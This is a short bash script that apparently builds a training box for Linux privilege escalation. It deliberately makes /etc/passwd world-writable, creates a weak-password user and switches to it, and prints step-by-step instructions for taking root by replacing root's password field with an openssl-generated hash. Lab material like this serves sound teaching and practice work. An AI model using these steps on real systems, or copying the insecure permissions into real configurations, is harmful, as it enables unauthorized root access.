#!/bin/bash

#if the /etc/passwd.is writable this may help to get privilege escalation to root
#step by step instruction are provided


echo "Bad Linux sysadmin is configuring this box..."
chmod 777 /etc/passwd 

echo ""
echo "Step 1: Before we add our new user, first create a password hash. You do this with:"
printf "\x1b[31m\"openssl passwd -1 -salt [salt] [password]\"\x1b[0m\n";
echo "Replace salt with '123' and password with '123456'"
echo "Step 2: Now take over root. Copy your hash and replace the x on line:"
printf "\x1b[31m\"root:x:0:0:root:/root:/bin/ash\"\x1b[0m\n"
echo "You can use nano to edit the /etc/passwd file. Type"
printf "\x1b[31m\"nano /etc/passwd\"\x1b[0m\n"
echo "Then press ctrl+o to save and ctrl+x to exit"
echo "Step 3: Type su and then the password '123456', you should be root"
echo ""

echo "Changing to user1..."
adduser -S user1 -u 321 -D -s /bin/bash
echo user1:password | chpasswd
su user1
clear
cd $HOME 
whoami

 
